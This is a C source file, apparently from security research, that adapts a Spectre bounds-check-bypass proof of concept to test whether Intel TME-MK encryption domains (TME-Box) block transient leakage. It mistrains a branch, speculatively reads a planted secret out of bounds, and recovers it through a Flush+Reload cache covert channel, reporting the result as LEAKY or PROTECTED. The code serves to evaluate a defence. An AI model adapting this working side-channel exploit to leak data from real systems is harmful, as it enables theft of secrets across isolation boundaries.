#include <assert.h>
#include <malloc.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <keyutils.h>
#include <sys/mman.h>

#include "cacheutils.h"


#define sys_encrypt_mprotect    451
long enc_mprotect(void *addr, size_t len, int prot, key_serial_t key) {
  return syscall(sys_encrypt_mprotect, addr, len, prot, key);
}

#define MEASUREMENTS 100000
#define ASSERT_DOMAIN(pointer, domain) (char *)((((uint64_t)(pointer)) & ~kPtrTagMask) | ((uint64_t)(domain) & kPtrTagMask))

typedef void (*cache_encode_fp)(char*,char,size_t);

/********************************************************************
TME-Box code.
Source: https://github.com/IntelLabs/TME-MK-Fine-Grained-Encryption-Integrity/blob/502f9c1f9bdd73f9f7731633916e680fe9835608/test.c
********************************************************************/
#define CLSIZE 64
#define CLMASK (uintptr_t)(CLSIZE - 1)

uint64_t kPtrTagMask = 0x00003f0000000000uLL;
#define _read8_q(ptr)                                                          \
  ({                                                                           \
    volatile uint64_t __result = 0xDEAD;                                       \
    __result = (*(volatile uint64_t *)(ptr));                                  \
    __result;                                                                  \
  })
#define _write_q(ptr, value)                                                   \
  do {                                                                         \
    (*(volatile uint64_t *)(ptr)) = (uint64_t)(value);                         \
  } while (0)
#define _is_tagged(ptr) ((uint64_t)(ptr) & kPtrTagMask)
#define _is_aligned(ptr) (((uintptr_t)(p) & CLMASK) == 0)
#define _check_access(ptr)                                                     \
  do {                                                                         \
    if ((uintptr_t)ptr != 0 && (uintptr_t)ptr != -1ULL) {                      \
      uint64_t _expected = 0xFF00000000000000ULL | (uint64_t)ptr;              \
      volatile uint64_t _result = 0;                                           \
      volatile uint64_t _previous = _read8_q(ptr);                             \
      _write_q(ptr, _expected);                                                \
      _result = _read8_q(ptr);                                                 \
      assert(_result == _expected);                                            \
      _write_q(ptr, _previous);                                                \
    }                                                                          \
  } while (0)

void *check(void *p) {
  printf("p = %13p  ", p);

#if defined(SCENARIO1) || defined(SCENARIO2) || defined(SCENARIO3)
  assert(_is_aligned(p));
  printf("[OK] aligned. ");

  assert(_is_tagged(p));
  printf("[OK] tagged. ");

  _check_access(p);
  printf("[OK] access. ");
#endif

  printf("\n");
  return p;
}

/********************************************************************
Transientfail Spectre PHT sa_ip code.
Source: https://github.com/isec-tugraz/transientfail/blob/43947508d8ba9ffc3066ae6781174de8ac5c6de1/pocs/spectre/PHT/sa_ip/main.c
Modified to work with TME-Box
********************************************************************/
// accessible data
#define PUBLIC "data|"
// inaccessible secret (following accessible data)
#define SECRET "INACCESSIBLE SECRET"

size_t public_sz = 128;
char *public;
size_t secret_sz = 128;
unsigned char *secret;

void dummy_function(char *a, char c, size_t s) {
  mfence();
}

void access_array(long x, cache_encode_fp fp) {
  // flushing the data which is used in the condition increases
  // probability of speculation
  char *tmp;
#if defined(SCENARIO1)
  tmp = ASSERT_DOMAIN(&public[x], public);
#elif defined(SCENARIO2)
  tmp = &public[x];
#else
  tmp = &public[x];
#endif
  size_t len = sizeof(PUBLIC) - 1;
  size_t *len_p = &len;
  size_t **len_pp = &len_p;
  long zero = 0;
  long *zero_p = &zero;
  long **zero_pp = &zero_p;
  mfence();
  flush(&len);
  flush(&len_p);
  flush(&len_pp);
  flush(&zero);
  flush(&zero_p);
  flush(&zero_pp);

  // ensure data is flushed at this point
  mfence();

  // check that only accessible part (PUBLIC) can be accessed
  if (0 <= (double)x / (double)**len_pp && (double)x / (double)**len_pp < 1) {
    // countermeasure: add the fence here
    // Encode in cache
    char c = *tmp;
  #if defined(SERIALIZE_SW)
    mfence();
  #endif
    fp(mem, c, pagesize);
  }
}

key_serial_t key;
void init_key() {
  char *key_type = "mktme";
  char *key_desc = "code_page";
  char *key_opt = "type=cpu algorithm=aes-xts-128";
  key = add_key(
    key_type, 
    key_desc, 
    key_opt, 
    strlen(key_opt), 
    KEY_SPEC_THREAD_KEYRING);
  if (key == -1) {
    printf("\tadd_key FAILED!\n");
    fflush(stdout);
    exit(-1);
  }
}

void *copy_function_to_new_domain(void *fp, size_t f_len) {
  void *addr  = (void *)((1L<<44) & kPtrTagMask);
  size_t len  = (f_len & ~(pagesize - 1)) + pagesize;
  int prot    = PROT_READ | PROT_WRITE | PROT_EXEC;
  int flags   = MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE;

  void *code_page = mmap(addr, len, prot, flags, -1, 0);
  if (code_page == MAP_FAILED) {
    printf("\tmmap FAILED!\n");
    fflush(stdout);
    keyctl(KEYCTL_INVALIDATE, key);
    exit(-1);
  }
  assert(((uint64_t)code_page & 0xFFF) == 0);
  enc_mprotect(code_page, len, prot, key);
  printf("code_page @ %p\n", code_page);

  memcpy(code_page, fp, f_len);
  return code_page;
}

int main(int argc, const char **argv) {

  pagesize = sysconf(_SC_PAGESIZE);
  if (!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n",
         CACHE_MISS);

  char *_mem = malloc(pagesize * (256 + 4));
  // page aligned
  mem = (char *)(((size_t)_mem & ~(pagesize - 1)) + pagesize * 2);
  // initialize memory
  memset(mem, 0, pagesize * 256);

  init_key();
  void *code_page = copy_function_to_new_domain(cache_encode_new, pagesize);

#if defined(SCENARIO3)
  cache_encode_fp encode_cache = (cache_encode_fp)ASSERT_DOMAIN(code_page, public);
#else
  cache_encode_fp encode_cache = (cache_encode_fp)code_page;
#endif

  printf("secret: ");
  secret = check(malloc(secret_sz));
  memset(secret, ' ', secret_sz);
  memcpy(secret, SECRET, sizeof(SECRET));
  secret[sizeof(SECRET)] = 0;

  printf("data:   ");
  public = check(malloc(public_sz));
  memset(public, ' ', public_sz);
  memcpy(public, PUBLIC, sizeof(PUBLIC));
  public[sizeof(PUBLIC)] = 0;

  // flush our shared memory
  flush_shared_memory();

  // nothing leaked so far
  long offset = (long)secret - (long)public;
  printf("offset: %ld\n", offset);
  char leaked[sizeof(SECRET)];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(SECRET) - 1] = 0;

#if defined(EXEC_PREV)
  assert(((uint64_t)cache_encode_new & 0xFFF) == 0);
  mprotect(cache_encode_new, pagesize, PROT_READ | PROT_WRITE);
#endif

  int score = 0;
  for (int run = 0; run < MEASUREMENTS ; ++run) {
    // for every byte in the string
    int j = run % (sizeof(SECRET) - 1);

    // mistrain with valid index
    for (int y = 0; y < 10; y++) {
      access_array(0, dummy_function);
    }
    // potential out-of-bounds access
#if defined(EXEC_PREV)
    access_array(offset + j, cache_encode_new);
#else
    access_array(offset + j, encode_cache);
#endif

    // only show inaccessible values (SECRET)
    mfence(); // avoid speculation
    // Recover data from covert channel
    char c = cache_decode_i(j);
    if (c != '_') leaked[j] = c;

    score += (c == secret[j] && c != ' ' && c != '\0');

    sched_yield();
  }
  printf("secret: %s\n", secret);
  printf("leaked: "FG_YELLOW"%s"RESET"\n", leaked);
  printf(FG_YELLOW"SCORE: %d/%d"RESET"\t>>> %s <<<\n", score, MEASUREMENTS, score > 0 ? FG_RED"LEAKY"RESET : FG_GREEN"PROTECTED"RESET);
  printf("[\x1b[32m>\x1b[0m] Done\n");

  free(secret);
  free(public);
  munmap(code_page, 4*pagesize);
  keyctl(KEYCTL_INVALIDATE, key);
  return (0);
}
